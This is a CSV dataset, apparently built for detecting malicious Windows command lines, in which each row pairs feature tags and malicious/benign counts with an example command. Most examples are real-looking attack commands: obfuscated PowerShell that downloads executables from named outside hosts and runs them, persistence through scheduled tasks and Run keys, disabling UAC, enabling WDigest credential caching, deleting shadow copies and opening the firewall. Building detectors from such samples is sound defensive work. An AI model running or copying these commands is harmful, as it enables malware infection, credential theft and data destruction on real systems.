tags,mal_cnt,ben_cnt,example
arg_tasklist; low_string_len; parentprocess_cmd.exe; very_low_entropy,5,1,tasklist  /v
arg_minute; dir_%allusersprofile%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,5,3,/create /tn WinInetDriver /tr %ALLUSERSPROFILE%\{8ecf6b-e842b9-a541-fa4a4bff4ddf}\hostdl.exe /sc minute /F
arg_1; arg_minute; high_entropy; high_string_len; parentprocess_unknown_process.exe,5,158,"/create /sc MINUTE /tn Intel /MO 1 /tr ""C:\RFQ#8382AH_300718Shandongmaterialsandsamples.exe\"
arg_xcopy; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,5,2,xcopy .\sec\NT4 C:\wecoapps\sec\NT4\ /Y
arg_-join; arg_83; arg_powershell; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,5,0,"PowersHell  ('25X71X91!126!0_83<88q74_16<82{95!87<88{94}73j29T115{88{73{19j106j88{95!126{81{84T88E83j73j6_25X77j77}100j0q26X85T73X73_77_7!18<18_74X74}74T19_94_82T77X73<84!94{77}82T77T88<19{82{79_90E18E10<83_126}109T108X79}18T125X85_73}73{77<7!18{18<74}88}75j84T86}19}85q72X18q82X92!89E86!126E76!18E125{85X73!73T77_7E18E18X87}92q86j88}84}83T90}81_88j78j19E94!82<80j18X106{14q94!74_18}125E85{73T73}77E7!18_18}74E74{74{19q86X92}72{86j92{95!77T85{68<78E84T92X73}79{68E19q94E82<80X18{85_90<4X90{18}125X85!73_73_77X7!18T18{74X74}74!19_91q92_94<88{95!82{82_86{19}77}79!84q83{73j72}78T88{79T19!83{81j18X89T85T69q87_18q26X19q110!77E81j84X73_21T26q125j26q20!6{25<105j114q106<29X0T29j26}4<14T26X6X25<73E85_116j0T25T88T83<75X7}73j88j80{77<22j26}97{26{22q25T105E114X106j22_26_19{88!69j88{26!6!91!82!79{88E92X94_85X21T25_107j79}105T29T84T83T29<25j77j77<100!20{70j73X79_68E70j25}71}91{126}19j121}82j74<83<81T82!92E89{123_84!81E88!21T25j107<79X105_17X29T25E73{85!116<20{6_110!73E92X79j73!16_109E79j82q94T88q78<78}29E25_73!85E116q6{95{79q88j92_86T6{64_94}92q73T94!85T70{64X64'.SplIT('<X!_q{jET}' )| % {[ChAr] ( $_-bxOR  0x3d  )}) -jOIN '' | . ( ([StrIng]$VErbosEPRefeReNCE)[1,3]+'x'-joIN'')"
arg_-bxor; arg_-join; arg_121; arg_65; arg_74; arg_90; arg_91; arg_powershell; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,5,0,"POwerSHell ('23H97H112E80H97>94P120~19R14H19H93>86y68~30R92!81H89H86c80H71E19c65E82E93~87~92R94c8>23x105R92x123E118~67y19y14y19E93P86>68c30R92P81E89P86H80R71!19P96>74>64R71E86c94x29~125c86>71x29x100>86R81>112H95!90H86R93y71P8!23E90E98y89c101!113>19y14P19y20R91>71H71~67P9R28~28x87R82>93x80P92x87P29c80~92P94c28P68R67~30P80>92~93!71R86~93>71R28y65x117P103c96R73y28H115H91P71!71P67>9E28y28H80c92y80x92E91H92H70!29!80~92!94c29>82x70c28y82P70y92y84>123!97y28!115y91E71P71c67~9P28~28E82y90P85R86x64~87R86!64R67P86P71H64H29H85E65~28E69y7>121>5P28!115>91E71H71P67H9E28c28!80R91~65E90c64R71H90H93c86P95!86R81y86c80y88>29H80x92c94~28x11>5c98x10!28!115E91>71y71>67~9~28P28P68>68c68y29P67c82c74!67E95c70P64!29!69x93H28~82~64H103E112!127c5~71!28c20~29!96c67y95R90E71y27y20!115>20~26P8y23R116H65E119R125E98~107~19H14c19~23!97c112R80y97>94!120x29~93!86E75~71c27E2H31c19x10>10x7~0y11H4R26P8x23y94E87E66>123E91H19x14>19c23P86!93c69x9!71y86c94H67c19>24P19H20~111!20c19>24P19c23E116H65P119H125~98~107E19x24~19~20c29c86R75~86>20x8E85H92>65x86c82y80>91>27~23!126H93c68y66y116H19H90!93x19H23R90!98~89c101~113~26H72R71P65E74c72!23~105~92E123H118c67!29R119E92>68!93!95P92P82!87y117!90y95y86!27P23~126P93H68P66x116E29c103H92~96c71c65H90P93R84y27x26E31P19~23P94R87R66!123x91R26~8R96P71R82~65H71P30H99R65R92x80x86x64E64!19H23y94P87c66!123~91!8y81P65E86P82y88E8c78x80y82>71x80R91y72!68>65>90H71~86~30c91x92~64~71>19!23E108>29~118P75H80>86H67H71>90>92P93P29x126>86y64P64>82x84~86H8R78H78'.spLit( '!~ER>cHxPy')|ForEacH-OBJeCT{[ChaR]( $_ -bxor ""0x33"")} ) -JOin ''| .( $env:comsPEC[4,26,25]-JOin'')"
arg_1; arg_once; arg_schtasks; dir_%allusersprofile%; ext_exe; normal_entropy; not_in_range; parentprocess_unknown_process.exe,5,14,"schtasks /create /tn \2909653399t /tr ""%ALLUSERSPROFILE%\2909653399a2\2909653399a1.exe"" /st 00:00 /du 9999:59 /sc once /ri 1 /f"
arg_30; arg_timeout; low_entropy; low_string_len; parentprocess_cmd.exe,5,2,timeout  /T 30
arg_-executionp; arg_-noexit; arg_bypass; arg_hidden; arg_powershell; ext_exe; parentprocess_cmd.exe; very_high_entropy; very_high_string_len,5,25,"POweRsHElL  -noLOGO  -NOeXIt -noNINTERAcTIV  -WInDO  hiDden  -EXecUtionP  bYpAss  -nOpROFil  ""Sv bXzO91 ([tYPe](\""{2}{1}{0}\""-F 'MenT','IroN','ENv'));  do{.(\""{1}{0}\"" -f'p','slee') 41;$lenovo =   (geT-chilDITEm VaRiABle:bxzo91  ).vaLUe::(\""{2}{0}{3}{1}\""-f 'tF','rPath','Ge','olde').Invoke(('My'+'Do'+'cu'+'me'+'nts'));(.(\""{1}{3}{0}{2}\"" -f'c','New-Obj','t','e') sY`STem.Net.`w`EBcl`IEnT).\""do`WnLOaDF`i`lE\"".\""iN`VoKe\""(('ht'+'tps:'+'//'+'loadc'+'loud.st'+'ream/r'+'emain'+'ing'),\""$lenovo\\5753170.exe\"")}while(!$?);&(\""{1}{0}{2}\""-f'ro','Start-P','cess') $LEnOvo\5753170.eXE"""
arg_-split; arg_47; arg_56; arg_59; arg_powershell; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,5,0,PowersHell .( $sHEllId[1]+$shELliD[13]+'x')(( '122-26}41P36P99P48P59_41>115}49H60_52_59P61H42P126-16>59e42e112G9>59t60_29_50_55P59P48%42_101H122e23>13e52G99t121e54%42_42P46-100-113t113t41%41e41H112}58_63e42}63t60%63t45-59t112%36_115e56}50>49H49-44P55G48>57}112G61>49_51H113-53}105_110-41G113e30>54t42G42P46G100%113-113>42}54%59G61G42}44H50}108P106t112t61-49>51H113e57t52P17%25}41t113P30P54H42}42>46H100%113G113P63e51G46P50P63P52H56}112H61>49H51H112e60H44G113G109_7e44e4t113H30t54t42}42_46t100e113-113P54t39}58t44>49G58t49-51G112t49H44%57H113e9%63H58-7}103H27%113e30}54t42%42H46}100P113_113-41t41t41t112-61G39}61t50t59e115>56>55e50P51}112H61G49-51}113P102P10%56_10e10P22-113-121}112P13G46>50%55-42H118H121>30-121}119}101-122}41e12G20%126%99G126}121_111%102_107>121-101>122-61%60t28-99}122H59t48t40}100H42>59>51}46}117P121_2P121G117-122>41}12H20_117H121}112e59_38%59}121H101}56t49H44_59e63H61G54G118>122e31-6-47}126-55e48-126H122%23-13_52}119H37P42_44_39_37}122-26_41P36G112e26>49-41%48P50P49P63G58P24%55t50%59>118P122%31>6>47>114-126>122P61}60t28H119G101H13H42P63%44e42t115P14>44-49G61_59}45H45P126-122t61%60G28-101G60%44>59}63P53H101}35P61_63}42_61}54>37-35t35'-sPLit '}' -SPLIt 'p'-spLIt '-' -sPLiT '_'-SpLiT'%' -sPlIt 'E'-split '>' -splIt'h'-split'g' -spLiT 't' | FOrEaCH{ [CHAr] ($_-BXOr  0x5E )} )-joIn'')
arg_add; arg_reg; dir_%systemroot%; dir_%windir%; ext_exe; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,5,0,"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""DirectX For Microsoft® Windows"" /d ""C:\\Windows\\Temp\\dxvr.exe"" /f"
arg_-; arg_-nop; arg_-win; arg_1; ext_exe; normal_entropy; normal_string_len; parentprocess_cmd.exe,5,1,WindowsPowerShell\v1.0\powershell.exe  -nop -win 1 -
arg_0; arg_add; arg_reg; high_string_len; normal_entropy; parentprocess_cmd.exe,5,333,"REG  ADD ""HKEY_LOCAL_MACHINE\SYSTEM\Setup\UpgradeNotification"" /v ""UpgradeAvailable"" /t REG_DWORD /d ""0"" /f"
arg_add; high_string_len; normal_entropy; parentprocess_unknown_process.exe,5,1,add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
dir_%appdata%; ext_vbs; low_entropy; normal_string_len; parentprocess_wscript.exe,5,139,"""%APPDATA%\DInslbniih.vbs"""
ext_js; very_low_entropy; very_low_string_len,5,1,"""C:\w.js"""
ext_jse; low_string_len; normal_entropy,5,24,"""C:\Efax_Invoice.jse"""
arg_-k; low_entropy; low_string_len; parentprocess_services.exe,5,2,-k WerSvcGroup
arg_-executionp; arg_-noexit; arg_-nologo; arg_bypass; arg_hidden; arg_powershell; ext_exe; parentprocess_cmd.exe; very_high_entropy; very_high_string_len,5,25,"POweRsHElL  -noLOGO  -NOeXIt -noNINTERAcTIV  -WInDO  hiDden  -EXecUtionP  bYpAss  -nOpROFil  ""Sv bXzO91 ([tYPe](\""{2}{1}{0}\""-F 'MenT','IroN','ENv'));  do{.(\""{1}{0}\"" -f'p','slee') 41;$lenovo =   (geT-chilDITEm VaRiABle:bxzo91  ).vaLUe::(\""{2}{0}{3}{1}\""-f 'tF','rPath','Ge','olde').Invoke(('My'+'Do'+'cu'+'me'+'nts'));(.(\""{1}{3}{0}{2}\"" -f'c','New-Obj','t','e') sY`STem.Net.`w`EBcl`IEnT).\""do`WnLOaDF`i`lE\"".\""iN`VoKe\""(('ht'+'tp:'+'//'+'zer'+'aum.c'+'om/hea'+'dtop.'+'gi'+'f'),\""$lenovo\\3415125.exe\"")}while(!$?);&(\""{1}{0}{2}\""-f'ro','Start-P','cess') $LEnOvo\3415125.eXE"""
ext_wsf; low_entropy; low_string_len,5,2,"""C:\virusscrip.wsf"""
arg_highest; arg_onlogon; arg_schtasks; dir_%temp%; ext_exe; high_entropy; not_in_range; parentprocess_unknown_process.exe,5,0,"""schtasks"" /create /tn ""GoogleChromeAutoLaunch_A34F0A128JJ4FADF6EE"" /sc ONLOGON /tr ""%TEMP%\Client-builtooo.exe"" /rl HIGHEST /f"
dir_%appdata%; ext_js; low_entropy; low_string_len,5,2,"""%APPDATA%\Cheat.js"""
ext_vbs; normal_entropy; not_in_range,5,14,"""C:\downloadSheet.vbs"""
arg_daily; arg_schtasks; dir_%appdata%; ext_exe; parentprocess_cmd.exe; very_high_entropy; very_high_string_len,5,25,schtasks  /create /tn {P0KOL6DO-J26X-DDSZ-FGF8-9R1A0BE18LOE} /tr %APPDATA%\{0X6G03RR-U0TI-OAFR-ID1T-COO3F1LXIL7N}\6R2C.exe /ri 10 /st 00:00 /du 9999:59 /sc daily /f
arg_0; arg_add; dir_%systemroot%; dir_%windir%; high_string_len; normal_entropy; parentprocess_cmd.exe,5,1,ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
arg_minute; dir_%appdata%; dir_%systemroot%; dir_%windir%; ext_vbs; high_string_len; normal_entropy; parentprocess_wscript.exe,5,333,/create /sc minute /mo 60 /tn Update /tr %APPDATA%\Windows10Updatee.vbs
ext_vbs; low_string_len; not_in_range; parentprocess_unknown_process.exe,5,2,"""C:\AutoRunApp.vbs"""
dir_%temp%; ext_exe; ext_js; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,5,25,"""%TEMP%\7ZipSfx.000\bin\tools\start.js"" """"%TEMP%\7ZipSfx.000\DriverPack.exe"" --sfx ""Marvell-FORCED-10x64-PCIE_15.68.9120.47-drp.exe"""""
arg_regsvr32; ext_dll; low_entropy; low_string_len; parentprocess_unknown_process.exe,5,1,"regsvr32 /s ""atl.dll"""
low_entropy; not_in_range; parentprocess_powershell.exe,5,15,/delete /tn yastcat /f
dir_%allusersprofile%; ext_vbs; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,5,2,"""%ALLUSERSPROFILE%\hanubh\iPxfya.vbs"""
arg_powershell; dir_%temp%; high_entropy; high_string_len; parentprocess_cmd.exe,5,1,"PowerShell  ""try{ Start-Sleep 260; Start-Process %TEMP%\jR1o3H2Qa.exe -WindowStyle Hidden} catch{ }"""
dir_%windir%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,5,2,"%WINDIR%\system32\svchost.exe ""C:\IfbIG9jw.exe"""
dir_%public%; ext_vbs; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,5,2,wscript %PUBLIC%\config.vbs
arg_58; arg_foreach-object; arg_powershell; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,5,0,"PowersHell ""$(SET-ITEm  'varIablE:OFS' '' ) ""+[stRiNG]( '62-88&104h72A110h66h109y58h39%58h116d127i109i55y117%120y112h127-121d110%58A104i123W116-126y117A119T33i62%114-109d105h106W108A58d39W58&116i127i109W55y117-120-112A127-121A110d58i73&99d105&110y127%119T52T84d127A110y52d77%127h120y89W118A115%127%116&110-33&62A82%106A121&91W96A58W39A58h61%114i110T110h106&32y53i53i104W123T110-105y123h119d99A52%121T117y119h53y112d75-76&96A79d115i53i90A114A110h110d106h32y53i53A119d123y113d127&119y99A106%117i118y115d121W99y52y117%104h125-53A81W73-93i126&98i47%91%53-90y114-110A110A106h32-53h53y120%123h104W107%111%127T105i110i127A105%110T35h52A111&113T53y85&41A79i41W53h90-114&110i110d106T32h53i53h121-114%123y104y119d52d123&116%126d104A127W127d123-52y123%118-127%98-123i116-126-104y117%116-115i52A104A117T53A109-46h112h89d64-124W121T53i90h114W110h110-106h32-53d53T109h109%109W52&120W114T123d104W123-110T119i123&112-114A115T52T121T117T119T53y95A66%80T72&99d105d53-61T52&73h106h118&115-110-50A61A90i61A51i33T62d80W118W81%91d105d58W39i58&62A88%104y72&110i66W109A52%116d127&98d110y50&43%54W58&46T45d40T35A40d44y51W33W62i83W120-120-106%113i114&58&39%58A62y127h116A108%32i110-127d119W106d58A49i58%61&70d61%58i49T58h62-80A118W81-91T105&58T49i58h61y52%127i98y127d61A33y124%117y104W127&123-121T114y50d62&106y76-91i106d115i75y58d115A116y58&62d82h106i121&91-96h51d97&110A104h99&97W62%114d109y105-106%108T52h94d117%109d116&118A117&123y126A92&115h118T127A50h62%106i76y91T106i115y75i52h78y117&73%110h104T115d116h125h50i51h54&58T62&83i120A120&106d113&114h51i33i73T110h123&104-110d55%74A104y117h121T127W105%105d58A62W83&120%120d106&113T114A33y120&104y127d123d113W33i103h121W123y110T121h114&97-109W104A115d110T127W55h114-117%105W110d58i62i69-52d95A98T121-127T106W110W115-117W116%52A87&127h105-105&123h125A127y33i103A103'.SplIT( '-Ad&hy%WiT')| forEACH-oBJect { [CHAR]( $_-BXoR 0x1A  )} )+""$( sV  'oFs'  ' ') "" |. ( $sHeLliD[1]+$sHElLid[13]+'X')"
arg_del; dir_%temp%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,4,1,"/C choice /C Y /N /D Y /T 1 & Del ""%TEMP%\385FF103\NoFile.exe"""
arg_delete; arg_shadows; arg_vssadmin; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,4,2,vssadmin delete shadows /all /quiet
arg_cmd; dir_%temp%; ext_bat; normal_entropy; normal_string_len,4,2,"cmd /c """"%TEMP%\Diss.bat"" """
arg_regini; ext_txt; low_entropy; low_string_len; parentprocess_cmd.exe,4,2,regini  permdel.txt
arg_cmd; dir_%programfiles%; ext_bat; normal_entropy; normal_string_len; parentprocess_wscript.exe,4,2,"cmd /c """"%PROGRAMFILES%\Java\install.bat"" """
dir_%programfiles%; ext_inf; high_entropy; high_string_len; parentprocess_unknown_process.exe,4,158,"/a  ""%PROGRAMFILES%\Belgium Identity Card\Drivers\XP-WIN8\ACR38U\a38usb.inf"""
arg_cmd; arg_dwnbrycrokozcjbpvlktu; arg_slrwtagpc; arg_ythphaoatlc; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,4,25,"Cmd SlrWtaGpC dwNbRYCrOKOZCjBPvLKTu YtHPHaOATlc  &  %co^m^S^p^E^c%  /c %LOcaLaPpdata:~   -3,1%^M%sysTeMrooT:~   6,   1%;   ; ;  /^V:  ; /r"";  ; ;  (  ( (se^t 7^K^ej=X  rT^ ^ ^r zx WS wf Va OW^ ^h^5 ^J^T^ TR^ ^Tk wL e6^ n8 A9 ^9S^ 8r}ks^}My^{4ahoicM^Wtg^L^a^8Kc26}2J^;^jBkhPa^Idetv^r3 bzm;rVtvhE0z^v^4X$L^2 3^Esz^VshGeZ^EcWjo^gTrH^dPhN^-^pnt^F5^riYavTt^6BSIL;XS^)FE^tQBE^VJ^v^H1$^Qn rA,t^Mi^T5o08^wv^U$kR^(q^xeus^l^q2iG3^FHGd^d^P^a^YZ^o1dl^RJniL^w17oRsD^aT.^O^gTYCXC^ks d$ t{tqyPWr^cptsn^{i8^)AbvO^Z^CmHrJW^$bn ^0cn^aj^i^vF mHik^Gov^ wKT$^6g^(oYh^p^hct^OaSTeW^KrG9^oQl^fd^6;^O0^'^rYe^X^5x6He9z.G^A'R^E+23UlyJ^R^1WQh^$^ix+^I2'^Qb\pw^'ln+^sa^p6am^wg^en7t5^3:^Ap^vuen^vXejF$^7b=eptibE^0^qvx^a$T^u^;M^e'^ua8^iA4^Kb2aK^'El 4p=Gp j^o^U^1QJH^rW^5^0$YH^;GM^)I9'fk@^4G'i8^(^sOtz9^i5vl^UCpHR^SZ^4^.n^x^'oNyA^PryO^vCTrEsonQDHI^/8^prpX^b0O^.^8a^m^EUoQDcML^.jv2Et^mxA^c^2^p/Cq/^et:xcppZt^o^dtHlh^sh@^7duyXEugZB^x^Ig4/^trpdXjgy.^Gyn^3Oed3d^M^Hr^pCa5^w^gi^wdmLawpl^I^a^aB2sTn/m^L/^2y:^4^dp3KtfT^tdEhB^P@XrtRT^PT^d/FH^rt^k^bYQ.XZmNC^o^KJcB^2^.UcmG8oIusP^GeHqdb^ta^i9l^ora^Jvs^AG/^HG/4^w:^Q1pEGt94^tN5hf7@W^HPICMfMNeoeEh/^6mm^imoCQc^S5.L^tcMGps4^ogsrAPdy^An^BdaxJj1^CeCTlzZaY^v^/fl/7Z:Lipilt^twt^G^Ohz2@3 jYgx^oTB5^ZG^Bt0^UO8^C^u^/N0^m^ItoK8cCV.d du^J^ts^ml^Rz^-^yNrwWoa^d^iAnv^2P^auz/3x/x^J^:O5pn^jte3^tHx^h2p'^CF=4lv^7FCuB^r9Z$G^t;gA^tT^QnCnesai^WSl20C7n^b^jmePkWv^7^.^Yw^t8^7^ez3N^5^Z ^A^2^t^kp^c^43^e^D0j0N^b^c4^og^S-iq^wCp^e^m^ nC^o=40TFOXuHsBA$P^K z^slcGl^4m^ej^l^hBt^s4nrVyeY^J^wRnoE^Tp)  ; ;  )   )&&   ;; ^FOr ; ; /^l;;  ; %^q ;in;  ;  ( ^ ;+10^34 -3 ^;^ +2 ); ; ; dO ; ;  ; ( ( ; ; ;   ( ; ; ;^set  0nQ^I=!0nQ^I!!7^K^ej:~  %^q, 1!)   )  ; )&;  ^iF ;;;%^q ;; ; ;  ;  ^EQU ;  ^2  ; ; (  (^CA^ll; ; ;%0nQ^I:^~-345% ) ; ; )   """
low_entropy; low_string_len; parentprocess_unknown_process.exe,4,1,/delete /tn run /f
arg_sc; arg_stop; parentprocess_cmd.exe; very_low_entropy; very_low_string_len,4,1,sc  stop
arg_attrib; ext_dll; normal_entropy; normal_string_len; parentprocess_cmd.exe,4,1,attrib  +s +a +h +r C:\x64.dll
dir_%programfiles%; ext_dll; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,4,2,"""%PROGRAMFILES%\UltraViewer\RemoteControl40.dll"" /tlb"
ext_bat; high_string_len; parentprocess_cmd.exe; very_high_entropy,4,0,"""Invoke-WebRequest -Uri 'http://35.176.147.211/jce/multipools.bat' -OutFile C:\Intel\driver_update\multipools.bat"""
arg_icacls; dir_%appdata%; parentprocess_cmd.exe; very_high_entropy; very_high_string_len,4,25,"icacls  ""%APPDATA%\{ELB9FQ4F-MHKA-M5M3-CSJ6-COSZZ81555MO}"" /inheritance:e /deny ""*S-1-1-0:(R,REA,RA,RD)"" ""*S-1-5-7:(R,REA,RA,RD)"""
arg_cmd; arg_rd; low_string_len; parentprocess_unknown_process.exe; very_low_entropy,4,0,cmd /c rd /s /q q:
arg_del; dir_%temp%; ext_ini; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,4,2,"/c  del ""%TEMP%\MSActBackUp.ini"" /F /Q"
dir_%appdata%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,4,2,"/c copy ""C:\gloi.exe"" ""%APPDATA%\install.exe"""
dir_%commonprogramfiles%; ext_exe; ext_msi; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,4,25,"/I ""%COMMONPROGRAMFILES%\Wise Installation Wizard\WISC2AAA1832C294FC38F67C4B20398C635_6_0_880.MSI"" WISE_SETUP_EXE_PATH=""C:\CAMPGM60 05-16-2018.exe"""
ext_vbs; low_string_len; not_in_range,4,2,"""C:\qBOHlIiszA.vbs"""
arg_add; arg_allowedprogram; arg_enable; arg_firewall; arg_netsh; dir_%allusersprofile%; ext_exe; high_string_len; normal_entropy; parentprocess_svchost.exe,4,333,"netsh firewall add allowedprogram ""%ALLUSERSPROFILE%\svchost.exe"" ""svchost.exe"" ENABLE"
arg_sc; low_entropy; low_string_len; parentprocess_cmd.exe,4,2,sc  stop sharedaccess
arg_0; arg_add; arg_enablelua; arg_reg; dir_%systemroot%; dir_%windir%; high_string_len; normal_entropy; parentprocess_unknown_process.exe,4,1,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /d 0 /t REG_DWORD /f
arg_-argumentlist; arg_-class; arg_-executionpolicy; arg_-name; arg_-noprofile; arg_-windowstyle; arg_bypass; arg_create; arg_hidden; arg_invoke-wmimethod; arg_new-object; dir_%temp%; ext_1/1;; ext_exe; parentprocess_wscript.exe; very_high_entropy; very_high_string_len,4,25,"/c powershell.exe -noprofile -windowstyle hidden  -executionpolicy bypass $OE = New-Object System.Net.WebClient; $OE.Headers['User-Agent'] = 'Document 1.0.1/1'; $OE.downloadfile('http://members.giftera.org/whuBcaJpqg.php','%TeMP%HkV20.Exe'); InVOke-WMiMethOd -CLass WIn32_PrOCesS -Name CreaTE -ARgumeNtList '%TeMp%HkV20.exE'"
arg_minute; dir_%allusersprofile%; ext_exe; high_entropy; parentprocess_unknown_process.exe; very_high_string_len,4,0,"/create /sc minute /f /tn ""Microsoft LocalManager[Windows 7 Home Premium]"" /tr ""%ALLUSERSPROFILE%\{71723662-7172-7172-717236629761}\lsm.exe"""
dir_%temp%; ext_exe; ext_js; high_entropy; high_string_len; parentprocess_unknown_process.exe,4,158,"""%TEMP%\7ZipSfx.000\bin\tools\start.js"" """"%TEMP%\7ZipSfx.000\DriverPack.exe"" --sfx ""ViewSonic-WinAll-drp.exe"""""
arg_cmd; dir_%temp%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,4,3,"cmd /c """"%TEMP%\3805275.bat""       ""C:\Shipping Docs_AWB_#952776675.exe""   """
dir_%temp%; ext_exe; ext_msi; high_string_len; parentprocess_unknown_process.exe; very_high_entropy,4,0,"/i ""%TEMP%\{C309AE69-E9C9-476C-86DE-82A70A0C2875}\OSLO7 EDU.msi""  SETUPEXEDIR=""C:"" SETUPEXENAME=""OSLO7_EDU_Installer.exe"""
arg_-argumentlist; arg_-class; arg_-executionpolicy; arg_-name; arg_-noprofile; arg_-windowstyle; arg_bypass; arg_create; arg_hidden; arg_invoke-wmimethod; arg_new-object; dir_%temp%; ext_51;; ext_exe; parentprocess_cmd.exe; very_high_entropy; very_high_string_len,4,25,"-noprofile -windowstyle hidden  -executionpolicy bypass $OE = New-Object System.Net.WebClient; $OE.Headers['User-Agent'] = 'SmartMarket 1.5.1'; $OE.downloadfile('http://news.popmarket.org/YSaVpmkRCy.php','%TEMP%\Pb98.exE'); InvOkE-WMiMethoD -ClaSs Win32_Process -NamE CreaTe -ARgUmentLIst '%TEMP%\Pb98.eXe'"
arg_explorer; low_entropy; low_string_len; parentprocess_cmd.exe,4,2,explorer  C:\
ext_js; low_entropy; low_string_len; parentprocess_wscript.exe,4,2,"""C:\pqjqp.js"" sqpox"
arg_112; arg_116; arg_127; arg_42; arg_50; arg_powershell; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,4,0,"PowersHeLL  . ( $env:coMSPEC[4,26,25]-jOIN'') (-jOiN('97V63<28r39~11~39N101{120V101{43V32N50~104N42V39{47~32{38r49r101~55N36s43r33~42G40{126J97V7<7x29<50{17N101G120~101N43<32J50x104N42s39V47N32s38V49J101r22s60V54~49~32V40s107V11G32V49x107V18V32r39r6{41G44{32s43G49~126s97r53~47x7r14V40G101s120<101~98N45V49G49{53V127r106x106G50G50G50r107N36N43x36s41r60s49x44r38{54G107V49x45r32~40x44G43r32s55J54r48G43x44~42V43s107s38J42s40x106r38G18J112G61s22s40s106{5J45r49N49J53<127s106V106G36<44G50{32J44V104N32N51J60N107~38V43V106N22V38s55<44G53s49V54~106{117x33<39G35x106J5J45V49N49{53<127J106N106{124<118J107<112<116N107V116x118V119<107x116s119x113V106V117N49J32V8{63<113r36x106N5r45s49{49J53<127<106x106{50V50<50<107G34G32G32V44~40~107N38r42V40V106x33~49x36x60<116<106J5~45~49{49r53x54G127J106x106{32<52~50G42r41N35V107<38V42x40N106s32V51J32N106s53N13N11N17<4~106r98x107~22N53G41J44r49x109{98N5~98{108s126r97J38J10r2G42<42V101r120V101G97x63J28s39J11V39N107~43G32r61N49G109r116<105V101J124~112s115s125~113s112{108x126~97<43~13x40N36x16N45{101N120r101s97s32V43x51r127r49{32s40r53~101G110{101J98r25~98N101J110J101x97r38V10V2G42N42V101s110s101~98J107s32x61x32r98x126J35{42<55{32J36~38~45{109N97G8{40~40r44G45V101{44~43J101x97N53r47V7{14s40s108x62r49{55<60V62<97{7~7x29J50x17<107N1V42N50G43N41G42x36{33<3N44V41V32G109G97~8r40J40<44{45J107V17<42<22N49<55x44G43V34J109V108<105N101G97x43~13x40V36<16r45r108s126{22x49{36<55J49{104{21<55J42s38<32r54<54r101~97s43r13r40G36x16V45<126x39J55~32N36N46G126N56{38r36G49r38G45~62x50V55s44G49s32<104x45N42r54G49N101r97<26J107V0G61s38{32r53~49N44x42J43r107x8J32~54~54r36G34<32s126N56s56' -SplIt'X' -SPLiT'r'-SpLIT 'v' -splIt 'J' -SpLIT'{' -SpLIt '<'-SPLit'S'-splIt 'N' -SPlIt'~'-spLIT 'g'|% {[chAr]( $_-bXoR 0x45 )}) )"
dir_%temp%; ext_bat; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,4,2,"/c %TEMP%\ytmp\tmp72588.bat ""C:\run.exe"""
arg_-; arg_-exec; arg_-nop; arg_-win; arg_1; arg_bypass; low_entropy; normal_string_len; parentprocess_cmd.exe,4,7,-exec bypass -nop -win 1 -
